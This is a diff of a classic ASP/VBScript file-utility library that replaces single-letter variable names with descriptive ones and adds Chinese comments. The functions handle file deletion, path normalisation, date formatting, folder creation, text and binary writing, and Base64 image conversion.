-            b.DeleteFile(a), True
+    Set Fso = CreateObject("Scripting.FileSystemObject")
+        If Fso.FileExists(FileName) = True Then
+            Fso.DeleteFile(FileName), True
             DeleteFile = True
         End If
-    Set b = Nothing
-    If Err Then doError Err.Description, "DeleteFile 删除文件 函数出错，FileName=" & a
+    Set Fso = Nothing
+    If Err Then doError Err.Description, "DeleteFile 删除文件 函数出错，FileName=" & FileName
 End Function
 
-Function GetFileEditDate(ByVal a)
+Function GetFileEditDate(ByVal FileName)
     On Error Resume Next
-    Dim b, c
-    Call HandlePath(a)
-    Set b = CreateObject("Scripting.FileSystemObject")
-        If b.FileExists(a) = True Then
-            Set c = b.GetFile(a)
-                GetFileEditDate = c.DateLastModified
-            Set c = Nothing
+    Dim Fso, OpenFile
+    Call HandlePath(FileName)'获得完整路径
+    Set Fso = CreateObject("Scripting.FileSystemObject")
+        If Fso.FileExists(FileName) = True Then
+            Set OpenFile = Fso.GetFile(FileName)
+                GetFileEditDate = OpenFile.DateLastModified
+            Set OpenFile = Nothing
         End If
-    Set b = Nothing
-    If Err Then doError Err.Description, "GetFileEditDate 获得文件修改时间 函数出错，FileName=" & a
+    Set Fso = Nothing
+    If Err Then doError Err.Description, "GetFileEditDate 获得文件修改时间 函数出错，FileName=" & FileName
 End Function
 
-    Function Format_Time(a, b)
-        Dim c, d, e, f, g, h
+    Function Format_Time(s_Time, n_Flag)
+        Dim Y, M, D, H, Mi, S
         Format_Time = ""
-        If IsDate(a) = False Then Exit Function
-        c = Cstr(Year(a))
-        d = Cstr(Month(a))
-        If Len(d) = 1 Then d = "0" & d
-        e = Cstr(Day(a))
-        If Len(e) = 1 Then e = "0" & e
-        f = Cstr(Hour(a))
-        If Len(f) = 1 Then f = "0" & f
-        g = Cstr(Minute(a))
-        If Len(g) = 1 Then g = "0" & g
-        h = Cstr(Second(a))
-        If Len(h) = 1 Then h = "0" & h
-        Select Case b
+        If IsDate(s_Time) = False Then Exit Function
+        Y = Cstr(Year(s_Time))
+        M = Cstr(Month(s_Time))
+        If Len(M) = 1 Then M = "0" & M
+        D = Cstr(Day(s_Time))
+        If Len(D) = 1 Then D = "0" & D
+        H = Cstr(Hour(s_Time))
+        If Len(H) = 1 Then H = "0" & H
+        Mi = Cstr(Minute(s_Time))
+        If Len(Mi) = 1 Then Mi = "0" & Mi
+        S = Cstr(Second(s_Time))
+        If Len(S) = 1 Then S = "0" & S
+        Select Case n_Flag
             Case 1
-
-                Format_Time = c & "-" & d & "-" & e & " " & f & ":" & g & ":" & h
+                                    'yyyy-mm-dd hh:mm:ss
+                Format_Time = Y & "-" & M & "-" & D & " " & H & ":" & Mi & ":" & S
             Case 2
-
-                Format_Time = c & "-" & d & "-" & e
+                                    'yyyy-mm-dd
+                Format_Time = Y & "-" & M & "-" & D
             Case 3
-
-                Format_Time = f & ":" & g & ":" & h
+                                    'hh:mm:ss
+                Format_Time = H & ":" & Mi & ":" & S
             Case 4
-
-                Format_Time = c & "年" & d & "月" & e & "日"
+                                    'yyyy年mm月dd日
+                Format_Time = Y & "年" & M & "月" & D & "日"
             Case 5
-
-                Format_Time = c & d & e
+                                    'yyyymmdd
+                Format_Time = Y & M & D
             Case 6
-
-                Format_Time = c & d & e & f & g & h
+                                    'yyyymmddhhmmss
+                Format_Time = Y & M & D & H & Mi & S
             Case 7
-
-                Format_Time = d & "-" & e
+                                    'mm-dd
+                Format_Time = M & "-" & D
             Case 8
-
-                Format_Time = c & "年" & d & "月" & e & "日" & " " & f & ":" & g & ":" & h
+                                    'yyyy年mm月dd日
+                Format_Time = Y & "年" & M & "月" & D & "日" & " " & H & ":" & Mi & ":" & S
             Case 9
-
-                Format_Time = c & "年" & d & "月" & e & "日" & " " & f & "时" & g & "分" & h & "秒，" & GetDayStatus(f, 1)
+                                    'yyyy年mm月dd日H时mi分S秒 早上
+                Format_Time = Y & "年" & M & "月" & D & "日" & " " & H & "时" & Mi & "分" & S & "秒，" & GetDayStatus(H, 1)
             Case 10
-
-                Format_Time = c & "年" & d & "月" & e & "日" & f & "时"
+                                    'yyyy年mm月dd日H时
+                Format_Time = Y & "年" & M & "月" & D & "日" & H & "时"
             Case 11
-
-                Format_Time = c & "年" & d & "月" & e & "日" & " " & f & "时" & g & "分" & h & "秒"
+                                    'yyyy年mm月dd日H时mi分S秒
+                Format_Time = Y & "年" & M & "月" & D & "日" & " " & H & "时" & Mi & "分" & S & "秒"
             Case 12
-
-                Format_Time = c & "年" & d & "月" & e & "日" & " " & f & "时" & g & "分"
+                                    'yyyy年mm月dd日H时mi分
+                Format_Time = Y & "年" & M & "月" & D & "日" & " " & H & "时" & Mi & "分"
             Case 13
-
-                Format_Time = d & "月" & e & "日" & " " & f & ":" & g & " " & GetDayStatus(f, 0)
+                                    'yyyy年mm月dd日H时mi分 早上
+                Format_Time = M & "月" & D & "日" & " " & H & ":" & Mi & " " & GetDayStatus(H, 0)
             Case 14
-
-                Format_Time = c & "/" & d & "/" & e
+                                    'yyyy年mm月dd日
+                Format_Time = Y & "/" & M & "/" & D
             Case 15
-
-                Format_Time = c & "年" & d & "月 第" & GetCountPage(e, 7) & "周"
+                                    'yyyy年mm月 第1周
+                Format_Time = Y & "年" & M & "月 第" & GetCountPage(D, 7) & "周"
         End Select
 End Function
 
-Function Rw(a)
-    Response.Write(a)
+Function Rw(Str)
+    Response.Write(Str)
 End Function
 
-Function getFileExtName(a)
-    Dim b
-    b = InStrRev(a, ".")
-    If b > 0 Then
-        getFileExtName = Mid(a, b + 1)
+Function getFileExtName(FileName)
+    Dim Pos
+    Pos = InStrRev(FileName, ".")
+    If Pos > 0 Then
+        getFileExtName = Mid(FileName, Pos + 1)
     Else
         getFileExtName = ""
     End If
 End Function
 
-    Function HandlePath(a)
-        a = Replace(a, "/", "\")
-        a = Replace(a, "\\", "\")
-        a = Replace(a, "\\", "\")
-        dim b
-        b = false
-        if right(a, 1) = "\" then
-            b = true
+    Function HandlePath(Path)'Path前面不加ByVal 重定义，这样是为了让前面函数里可以使用这个路径完整调用
+        Path = Replace(Path, "/", "\")
+        Path = Replace(Path, "\\", "\")
+        Path = Replace(Path, "\\", "\")
+        dim isDir'为目录
+        isDir = false
+        if right(Path, 1) = "\" then
+            isDir = true
         end if
-        If InStr(a, ":") = 0 Then
-            If Left(a, 1) = "\" Then
-                a = Server.MapPath("\") & "\" & a
+        If InStr(Path, ":") = 0 Then
+            If Left(Path, 1) = "\" Then
+                Path = Server.MapPath("\") & "\" & Path
             Else
-                a = Server.MapPath(".\") & "\" & a
+                Path = Server.MapPath(".\") & "\" & Path
             End If
         End If
-        a = Replace(a, "/", "\")
-        a = Replace(a, "\\", "\")
-        a = Replace(a, "\\", "\")
-        a = FullPath(a)
-        if b = true then
-            a = a & "\"
+        Path = Replace(Path, "/", "\")
+        Path = Replace(Path, "\\", "\")
+        Path = Replace(Path, "\\", "\")
+        path = FullPath(Path)
+        if isDir = true then
+            Path = Path & "\"
         end if
-        HandlePath = a
+        HandlePath = Path
 End Function
 
-Function CreateDirFolder(ByVal a)
-
-    If CheckFolder(a) = True Then Exit Function
-    Dim b, c, d, e
-    Call HandlePath(a)
-    b = Split(a, "\")
-    For c = 0 To Ubound(b)
-        d = Trim(b(c))
-        If d <> "" Then
-            e = e & d & "\"
-            If c = Ubound(b) And InStr(d, ".") > 0 Then Exit For
-            If InStr(d, ":") = False Then
-
-                Call CreateFolder(e)
+Function CreateDirFolder(ByVal FolderPath)
+    'On Error Resume Next
+    If CheckFolder(FolderPath) = True Then Exit Function'文件夹存在，退出
+    Dim SplStr, I, S, NewFolder
+    Call HandlePath(FolderPath)'获得完整路径
+    SplStr = Split(FolderPath, "\")
+    For I = 0 To Ubound(SplStr)
+        S = Trim(SplStr(I))'去除两边空格
+        If S <> "" Then
+            NewFolder = NewFolder & S & "\"
+            If I = Ubound(SplStr) And InStr(S, ".") > 0 Then Exit For'创建到最后文件夹时，要是为文件则退出循环 20141215
+            If InStr(S, ":") = False Then
+                            'Call Echo("NewFolder",NewFolder)
+                Call CreateFolder(NewFolder)
             End If
         End If
     Next
 End Function
 
-Function DecSaveBinary(a, b, c)
-    Dim d, buf(), f
-    If c = "" Then c = 0
-    d = Split(b, "|")
-    ReDim buf(UBound(d))
-    For f = 0 To UBound(d)
-        buf(f) = CByte(CInt(d(f)) - c)
+Function DecSaveBinary(FilePath, Content, Pass)
+    Dim SplStr, buf(), I
+    If Pass = "" Then Pass = 0'如果为空则为零20150119
+    SplStr = Split(Content, "|")
+    ReDim buf(UBound(SplStr))
+    For I = 0 To UBound(SplStr)
+        buf(I) = CByte(CInt(SplStr(I)) - Pass)
     Next
-    Call WriteBinary(a, buf)
+    Call WriteBinary(FilePath, buf)
 End Function
 
-Function SpecialHtmlUploadEncryptionDecrypt(a, b)
-    Dim c, d, e, f
-    e = e & "·|[*-24156*]" & vbCrLf
-    c = Split(e, vbCrLf)
-    For Each f In c
-        If InStr(f, "|") > 0 Then
-            d = Split(f, "|")
-            If b = "1" Or b = "解密" Or b = "Decrypt" Then
-                a = Replace(a, d(1), d(0))
+Function SpecialHtmlUploadEncryptionDecrypt(Content, SType)
+    Dim SplStr, Splxx, C, S
+    C = C & "·|[*-24156*]" & vbCrLf
+    SplStr = Split(C, vbCrLf)
+    For Each S In SplStr
+        If InStr(S, "|") > 0 Then
+            Splxx = Split(S, "|")
+            If SType = "1" Or SType = "解密" Or SType = "Decrypt" Then
+                Content = Replace(Content, Splxx(1), Splxx(0))
             Else
-                a = Replace(a, d(0), d(1))
+                Content = Replace(Content, Splxx(0), Splxx(1))
             End If
         End If
     Next
-    SpecialHtmlUploadEncryptionDecrypt = a
+    SpecialHtmlUploadEncryptionDecrypt = Content
 End Function
 
-Function WriteToFile(ByVal a, ByVal b, ByVal c)
+Function WriteToFile(ByVal FileName, ByVal Content, ByVal Char_Set)
     On Error Resume Next
-    If c = "1" Or UCase(c) = "GB2312" Then
-        c = "GB2312"
-    ElseIf c = "0" Or UCase(c) = "UTF-8" Then
-        c = "UTF-8"
-    ElseIf c = "2" Or UCase(c) = "UNICODE" Then
-        c = "UNICODE"
+    If Char_Set = "1" Or UCase(Char_Set) = "GB2312" Then
+        Char_Set = "GB2312"
+    ElseIf Char_Set = "0" Or UCase(Char_Set) = "UTF-8" Then
+        Char_Set = "UTF-8"
+    ElseIf Char_Set = "2" Or UCase(Char_Set) = "UNICODE" Then
+        Char_Set = "UNICODE"
     Else
-        c = "GB2312"
+        Char_Set = "GB2312"
     End If
-
-    Dim d
-    Call HandlePath(a)
-    Set d = CreateObject("ADODB.Stream")
-        d.Type = 2
-        d.Mode = 3
-        d.Charset = c
-        d.Open
-        d.WriteText b
-        d.SaveToFile a, 2
-        d.Flush
-        d.Close
-        WriteToFile = a & "写入成功"
-    Set d = Nothing
-    If Err Then doError Err.Description, "WriteToFile，数据流写入内容 函数出错，FileName=" & a & "，Content字符" & Len(b)
+'Call Echo("Char_Set",Char_Set)
+    Dim Stm
+    Call HandlePath(FileName)'获得完整路径
+    Set Stm = CreateObject("ADODB.Stream")
+        Stm.Type = 2'以本模式读取
+        Stm.Mode = 3
+        Stm.Charset = Char_Set
+        Stm.Open
+        Stm.WriteText Content
+        Stm.SaveToFile FileName, 2
+        Stm.Flush
+        Stm.Close
+        WriteToFile = FileName & "写入成功"
+    Set Stm = Nothing
+    If Err Then doError Err.Description, "WriteToFile，数据流写入内容 函数出错，FileName=" & FileName & "，Content字符" & Len(Content)
 End Function
 
-Sub DoError(a, b)
-
-    Dim c, d
+Sub DoError(S, Msg)
+    'On Error Resume Next
+    Dim nRnd, C
     Randomize
-    c = CLng(Rnd() * 29252888)
-    d = "<br />"
-    d = d & "<div style=""width:100%; font-size:12px;;line-height:150%"">"
-    d = d & "  <label onClick=""ERRORDIV" & c & ".style.display=(ERRORDIV" & c & ".style.display=='none'?'':'none')"">"
-    d = d & "  <span style=""background-color:#820222;color:#FFFFFF;height:23px;font-size:14px;cursor:pointer"">〖 出错 提示信息 ERROR 〗</span><br />"
-    d = d & "  </label>"
-    d = d & "  <div id=""ERRORDIV" & c & """ style=""width:100%;border:1px solid #820222;padding:5px;overflow:hidden;"">"
-    d = d & " <span style=""color:#FF0000;"">出错描述</span> " & a & "<br />"
-    d = d & " <span style=""color:#FF0000;"">回显信息</span> " & b & "<br />"
-    d = d & "  </div>"
-    d = d & "</div>"
-    d = d & "<br />"
-    Response.Write(d)
-    Response.End()
+    nRnd = CLng(Rnd() * 29252888)
+    C = "<br />"
+    C = C & "<div style=""width:100%; font-size:12px;;line-height:150%"">"
+    C = C & "  <label onClick=""ERRORDIV" & nRnd & ".style.display=(ERRORDIV" & nRnd & ".style.display=='none'?'':'none')"">"
+    C = C & "  <span style=""background-color:#820222;color:#FFFFFF;height:23px;font-size:14px;cursor:pointer"">〖 出错 提示信息 ERROR 〗</span><br />"
+    C = C & "  </label>"
+    C = C & "  <div id=""ERRORDIV" & nRnd & """ style=""width:100%;border:1px solid #820222;padding:5px;overflow:hidden;"">"
+    C = C & " <span style=""color:#FF0000;"">出错描述</span> " & S & "<br />"
+    C = C & " <span style=""color:#FF0000;"">回显信息</span> " & Msg & "<br />"
+    C = C & "  </div>"
+    C = C & "</div>"
+    C = C & "<br />"
+    Response.Write(C)
+    Response.End()'终止，程序停止
 End Sub
 
-    Function GetDayStatus(a, b)
-        Dim c
-        If Left(a, 1) = "0" Then
-            a = Right(a, 1)
+    Function GetDayStatus(H, SType)
+        Dim C
+        If Left(H, 1) = "0" Then
+            H = Right(H, 1)
         End If
-        a = CInt(a)
-        If a >= 0 And a <= 5 Then
-            c = "凌晨"
-        ElseIf a >= 6 And a <= 8 Then
-            c = "早上"
-        ElseIf a >= 9 And a <= 12 Then
-            c = "上午"
-        ElseIf a >= 13 And a <= 18 Then
-            c = "下午"
-        ElseIf a >= 19 And a <= 24 Then
-            c = "晚上"
+        H = CInt(H)
+        If H >= 0 And H <= 5 Then
+            C = "凌晨"
+        ElseIf H >= 6 And H <= 8 Then
+            C = "早上"
+        ElseIf H >= 9 And H <= 12 Then
+            C = "上午"
+        ElseIf H >= 13 And H <= 18 Then
+            C = "下午"
+        ElseIf H >= 19 And H <= 24 Then
+            C = "晚上"
         Else
-            c = "深夜"
+            C = "深夜"
         End If
-        If b = 1 Then c = "<b>" & c & "</b>"
-        GetDayStatus = c
+        If SType = 1 Then C = "<b>" & C & "</b>"
+        GetDayStatus = C
 End Function
 
-    Function GetCountPage(a, b)
-
-        if a < 0 then
-            a = a * - 1
+    Function GetCountPage(nCount, nPageSize)
+            '把负数转成正确进行计算20150502
+        if nCount < 0 then
+            nCount = nCount * - 1
         end if
-        if b < 0 then
-            b = b * - 1
+        if nPageSize < 0 then
+            nPageSize = nPageSize * - 1
         end if
-        GetCountPage = Fix(a / b)
-        If InStr(a / b, ".") > 0 Then GetCountPage = GetCountPage + 1
+        GetCountPage = Fix(nCount / nPageSize)
+        If InStr(nCount / nPageSize, ".") > 0 Then GetCountPage = GetCountPage + 1
 End Function
 
-    Function FullPath(ByVal a)
-        Dim b, c, d
-        a = Replace(a, "/", "\")
-        b = Split(a, "\")
-        For Each c In b
-            c = Trim(c)
-            If c <> "" And c <> "." Then
-                If InStr(d, "\") > 0 And c = ".." Then
-                    d = Mid(d, 1, InStrRev(d, "\") - 1)
+    Function FullPath(ByVal Path)
+        Dim SplStr, S, C
+        Path = Replace(Path, "/", "\")
+        SplStr = Split(Path, "\")
+        For Each S In SplStr
+            S = Trim(S)
+            If S <> "" And S <> "." Then
+                If InStr(C, "\") > 0 And S = ".." Then
+                    C = Mid(C, 1, InStrRev(C, "\") - 1)
                 Else
-                    If d <> "" And Right(d, 1) <> "\" Then d = d & "\"
-                    d = d & c
+                    If C <> "" And Right(C, 1) <> "\" Then C = C & "\"
+                    C = C & S
                 End If
             End If
         Next
-        FullPath = d
+        FullPath = C
 End Function
 
-Function CheckFolder(ByVal a)
+Function CheckFolder(ByVal FolderName)
     On Error Resume Next
-    Dim b
-    Call HandlePath(a)
-    Set b = CreateObject("Scripting.FileSystemObject")
-        CheckFolder = b.FolderExists(a)
-    Set b = Nothing
-    If Err Then doError Err.Description, "CheckFolder 检查夹文件 函数出错，FolderName=" & a
+    Dim Fso
+    Call HandlePath(FolderName)'获得完整路径
+    Set Fso = CreateObject("Scripting.FileSystemObject")
+        CheckFolder = Fso.FolderExists(FolderName)
+    Set Fso = Nothing
+    If Err Then doError Err.Description, "CheckFolder 检查夹文件 函数出错，FolderName=" & FolderName
 End Function
 
-Function CreateFolder(ByVal a)
+Function CreateFolder(ByVal FolderPath)
     On Error Resume Next
-    Dim b
-    Call HandlePath(a)
+    Dim Fso
+    Call HandlePath(FolderPath)'获得完整路径
     CreateFolder = False
-    Set b = CreateObject("Scripting.FileSystemObject")
-        If b.FolderExists(a) = False Then
-            b.CreateFolder(a)
+    Set Fso = CreateObject("Scripting.FileSystemObject")
+        If Fso.FolderExists(FolderPath) = False Then
+            Fso.CreateFolder(FolderPath)
             CreateFolder = True
         End If
-    Set b = Nothing
-    If Err Then doError Err.Description, "CreateFolder 创建文件夹 函数出错，FolderPath=" & a & ":::" & b.FolderExists(a)
+    Set Fso = Nothing
+    If Err Then doError Err.Description, "CreateFolder 创建文件夹 函数出错，FolderPath=" & FolderPath & ":::" & Fso.FolderExists(FolderPath)
 End Function
 
-Sub WriteBinary(a, b)
-    Dim c, d, e, f
-    Call HandlePath(a)
-    e = UBound(b) : ReDim d(e \ 2)
-    For c = 0 To e - 1 Step 2
-        d(c \ 2) = ChrW(b(c + 1) * 256 + b(c))
+Sub WriteBinary(FilePath, Buf)
+    Dim I, aBuf, Size, bStream
+    Call HandlePath(FilePath)'获得完整路径
+    Size = UBound(Buf) : ReDim aBuf(Size \ 2)
+    For I = 0 To Size - 1 Step 2
+        aBuf(I \ 2) = ChrW(Buf(I + 1) * 256 + Buf(I))
     Next
-    If c = e Then d(c \ 2) = ChrW(b(c))
-    d = Join(d, "")
-    Set f = CreateObject("ADODB.Stream")
-        f.Type = 1
-        f.Open
+    If I = Size Then aBuf(I \ 2) = ChrW(Buf(I))
+    aBuf = Join(aBuf, "")
+    Set bStream = CreateObject("ADODB.Stream")
+        bStream.Type = 1
+        bStream.Open
         With CreateObject("ADODB.Stream")
             .Type = 2
             .Open
-            .WriteText d
+            .WriteText aBuf
             .Position = 2
-            .CopyTo f
+            .CopyTo bStream
             .Close
         End With
-        f.SaveToFile a, 2
-        f.Close
-    Set f = Nothing
+        bStream.SaveToFile FilePath, 2
+        bStream.Close
+    Set bStream = Nothing
 End Sub
-Function Echo(a, b)
-    Call echoPrompt(a, b)
+Function Echo(Word, Str)
+    Call echoPrompt(Word, Str)
 End Function
-Function echoPrompt(a, b)
-    Response.Write("<font color=Green>" & a & "</font>：" & b & "<br>")
+Function echoPrompt(Word, Str)
+    Response.Write("<font color=Green>" & Word & "</font>：" & Str & "<br>")
 End Function
-Function CreateAddFile(ByVal a, ByVal b)
+Function CreateAddFile(ByVal FileName, ByVal Content)
     On Error Resume Next
-    Dim c, d
-    Call HandlePath(a)
-    Set c = CreateObject("Scripting.FileSystemObject")
-        If c.FileExists(a) = False Then
-            Set d = c.CreateTextFile(a, True)
-                d.WriteLine(b)
-            Set d = Nothing
+    Dim Fso, FText
+    Call HandlePath(FileName)'获得完整路径
+    Set Fso = CreateObject("Scripting.FileSystemObject")
+        If Fso.FileExists(FileName) = False Then'文件不存在，则创建
+            Set FText = Fso.CreateTextFile(FileName, True)
+                FText.WriteLine(Content)
+            Set FText = Nothing
             CreateAddFile = "创建文件成功"
-        Else
-            CreateAddFile = AddToFile(a, b)
+        Else'文件存在，则累加
+            CreateAddFile = AddToFile(FileName, Content)
         End If
-    Set c = Nothing
-    If Err Then doError Err.Description, "CreateAddFile 创建文件，存在累加 函数出错，FileName=" & a
+    Set Fso = Nothing
+    If Err Then doError Err.Description, "CreateAddFile 创建文件，存在累加 函数出错，FileName=" & FileName
 End Function
-Function AddToFile(ByVal a, ByVal b)
+Function AddToFile(ByVal FileName, ByVal Content)
     On Error Resume Next
-    Dim c, d
-    Call HandlePath(a)
-    If ExistsZhiDuFile(a) = True Then
-        Call EditFileAttribute(a, 32)
+    Dim Fso, FText
+    Call HandlePath(FileName)'获得完整路径
+    If ExistsZhiDuFile(FileName) = True Then'判断是否为只读文件
+        Call EditFileAttribute(FileName, 32)'把只读属性改成存档属性
     End If
-    Set c = CreateObject("Scripting.FileSystemObject")
-        If c.FileExists(a) = True Then
-            Set d = c.OpenTextFile(a, 8)
-                d.WriteLine(b)
-            Set d = Nothing
+    Set Fso = CreateObject("Scripting.FileSystemObject")
+        If Fso.FileExists(FileName) = True Then
+            Set FText = Fso.OpenTextFile(FileName, 8)
+                FText.WriteLine(Content)
+            Set FText = Nothing
             AddToFile = "追加信息成功"
         End If
-    Set c = Nothing
-    If Err Then doError Err.Description, "AddToFile 追加文件信息 函数出错，FileName=" & a & "<br>Content字符长" & Len(b) & " Content类型" & TypeName(b) & "【" & b & "】"
+    Set Fso = Nothing
+    If Err Then doError Err.Description, "AddToFile 追加文件信息 函数出错，FileName=" & FileName & "<br>Content字符长" & Len(Content) & " Content类型" & TypeName(Content) & "【" & Content & "】"
 End Function
-Function ExistsZhiDuFile(ByVal a)
+Function ExistsZhiDuFile(ByVal FileName)
     On Error Resume Next
-    Dim b, c
+    Dim Fso, OpenFile
     ExistsZhiDuFile = False
-    Call HandlePath(a)
-    Set b = CreateObject("Scripting.FileSystemObject")
-        If b.FileExists(a) = True Then
-            Set c = b.GetFile(a)
-                ExistsZhiDuFile = c.Attributes
-            Set c = Nothing
+    Call HandlePath(FileName)'获得完整路径
+    Set Fso = CreateObject("Scripting.FileSystemObject")
+        If Fso.FileExists(FileName) = True Then
+            Set OpenFile = Fso.GetFile(FileName)
+                ExistsZhiDuFile = OpenFile.Attributes
+            Set OpenFile = Nothing
             If ExistsZhiDuFile >= 128 Then ExistsZhiDuFile = ExistsZhiDuFile - 128
             If ExistsZhiDuFile >= 64 Then ExistsZhiDuFile = ExistsZhiDuFile - 64
             If ExistsZhiDuFile >= 32 Then ExistsZhiDuFile = ExistsZhiDuFile - 32
             If ExistsZhiDuFile >= 8 Then ExistsZhiDuFile = ExistsZhiDuFile - 8
             If ExistsZhiDuFile >= 4 Then ExistsZhiDuFile = ExistsZhiDuFile - 4
             If ExistsZhiDuFile >= 2 Then ExistsZhiDuFile = ExistsZhiDuFile - 2
-            ExistsZhiDuFile = CBool(ExistsZhiDuFile)
+            ExistsZhiDuFile = CBool(ExistsZhiDuFile)'让它成为布而类型
         End If
-    Set b = Nothing
-    If Err Then doError Err.Description, "ExistsZhiDuFile 判断只读文件 函数出错，FileName=" & a
+    Set Fso = Nothing
+    If Err Then doError Err.Description, "ExistsZhiDuFile 判断只读文件 函数出错，FileName=" & FileName
 End Function
 
-Function EditFileAttribute(ByVal a, ByVal b)
+Function EditFileAttribute(ByVal FileName, ByVal N)
     On Error Resume Next
-    Dim c, d
-    Call HandlePath(a)
+    Dim Fso, OpenFile
+    Call HandlePath(FileName)'获得完整路径
     EditFileAttribute = False
-    Set c = CreateObject("Scripting.FileSystemObject")
-        If c.FileExists(a) = True Then
-            Set d = c.GetFile(a)
-                d.Attributes = b
-            Set d = Nothing
+    Set Fso = CreateObject("Scripting.FileSystemObject")
+        If Fso.FileExists(FileName) = True Then
+            Set OpenFile = Fso.GetFile(FileName)
+                OpenFile.Attributes = N'32文件
+            Set OpenFile = Nothing
             EditFileAttribute = True
         End If
-    Set c = Nothing
-    If Err Then doError Err.Description, "EditFileAttribute 修改文件属性 函数出错，FileName=" & a
+    Set Fso = Nothing
+    If Err Then doError Err.Description, "EditFileAttribute 修改文件属性 函数出错，FileName=" & FileName
 End Function
 
-
-Function ImagesToBase64(a)
-    Dim b
-    Dim c
-    Dim d
-    Dim e
-    Dim f
-    Dim g
-    Dim h
-    Dim i
-
-
-    e = HandlePath(a)
-    i = Mid(e, InStrRev(e, ".") + 1)
-    Set g = CreateObject("msxml2.FreeThreadedDOMDocument")
-
-        g.loadxml "<?xml version='1.0'?><Base64Data />"
-        Set d = CreateObject("Scripting.FileSystemObject")
-            If d.FileExists(e) Then
-
-                Set f = CreateObject("ADODB.Stream")
-                    f.Type = 1
-                    f.Open
-                    f.LoadFromFile e
-
-
-                    g.documentElement.DataType = "bin.base64"
-                    g.documentElement.nodeTypedValue = f.Read
+'图片转Base64 20150722引用网上 call echo("images/error.gif",ImagesToBase64("images/error.gif"))
+Function ImagesToBase64(FileName)
+    Dim xml
+    Dim root
+    Dim Fs
+    Dim FilePath
+    Dim objStream
+    Dim objXMLDoc
+    Dim Base64
+    Dim getFileExt
+     '定义变量完结
+     '创建对像
+    FilePath = HandlePath(FileName)
+    getFileExt = Mid(FilePath, InStrRev(FilePath, ".") + 1)
+    Set objXMLDoc = CreateObject("msxml2.FreeThreadedDOMDocument")
+        '设定生成XML文档的根为 Base64Data
+        objXMLDoc.loadxml "<?xml version='1.0'?><Base64Data />"
+        Set Fs = CreateObject("Scripting.FileSystemObject")    ''服务器需要FSO组件
+            If Fs.FileExists(FilePath) Then                                                 '判断File文件是否存在
+                '用 stream 来读取数据
+                Set objStream = CreateObject("ADODB.Stream")
+                    objStream.Type = 1
+                    objStream.Open
+                    objStream.LoadFromFile FilePath
 
 
-                    Set b = CreateObject("msxml2.FreeThreadedDOMDocument")
-                        b.Load g
-                        If b.ReadyState > 2 Then
-                            Set c = b.getElementsByTagName("Base64Data")
-
-
-                                h = c.Item(0).Text
+                    objXMLDoc.documentElement.DataType = "bin.base64"
+                    objXMLDoc.documentElement.nodeTypedValue = objStream.Read
+                    '数据流读取结束.得到了值 objXMLDoc
+                     '创建XML文件
+                    Set xml = CreateObject("msxml2.FreeThreadedDOMDocument")
+                        xml.Load objXMLDoc
+                        If xml.ReadyState > 2 Then
+                            Set root = xml.getElementsByTagName("Base64Data")
+                                'Base64="<img src=""data:image/"&getFileExt&";base64,"&vbcrlf&root.Item(0).Text&""">"
+                                'Base64 = "data:image/" & getFileExt & ";base64," & vbCrLf & root.item(0).text
+                                Base64 = root.Item(0).Text
                         Else
-                            h = ""
+                            Base64 = ""
                         End If
-                            Set b = Nothing
-                    Set f = Nothing
+                            Set xml = Nothing
+                    Set objStream = Nothing
             Else
-                h = ""
+                Base64 = ""
             End If
 
-                Set d = Nothing
-        Set g = Nothing
+                Set Fs = Nothing
+        Set objXMLDoc = Nothing
 
 
-        ImagesToBase64 = h
+        ImagesToBase64 = Base64
 End Function
 
-
-Function Base64ToImages(a, b)
-    Dim c
-    a = HandlePath(a)
-    c = "<data>" & b & "</data>"
-    Dim d: Set d = CreateObject("MSXML2.DOMDocument")
-        Dim e: Set e = CreateObject("ADODB.Stream")
-            d.resolveExternals = False
-            d.loadxml (c)
-            d.documentElement.setAttribute "xmlns:dt", "urn:schemas-microsoft-com:datatypes"
-            d.documentElement.DataType = "bin.base64"
-            e.Type = 1
-            e.Open
-            e.Write d.documentElement.nodeTypedValue
-            e.SaveToFile a
-            e.Close
-        Set d = Nothing
-    Set e = Nothing
+'Base64转图片 20150722 引用网上   call Base64ToImages("1.jpg",Base64Data)
+Function Base64ToImages(saveImagePath, Base64Data)
+    Dim XmlStr
+    saveImagePath = HandlePath(saveImagePath)
+    XmlStr = "<data>" & Base64Data & "</data>"
+    Dim xml: Set xml = CreateObject("MSXML2.DOMDocument")
+        Dim Stm: Set Stm = CreateObject("ADODB.Stream")
+            xml.resolveExternals = False
+            xml.loadxml (XmlStr)
+            xml.documentElement.setAttribute "xmlns:dt", "urn:schemas-microsoft-com:datatypes"
+            xml.documentElement.DataType = "bin.base64"
+            Stm.Type = 1                                                                    'adTypeBinary
+            Stm.Open
+            Stm.Write xml.documentElement.nodeTypedValue
+            Stm.SaveToFile saveImagePath
+            Stm.Close
+        Set xml = Nothing
+    Set Stm = Nothing
 End Function
 
-%>
-
+%> 
 
 
 
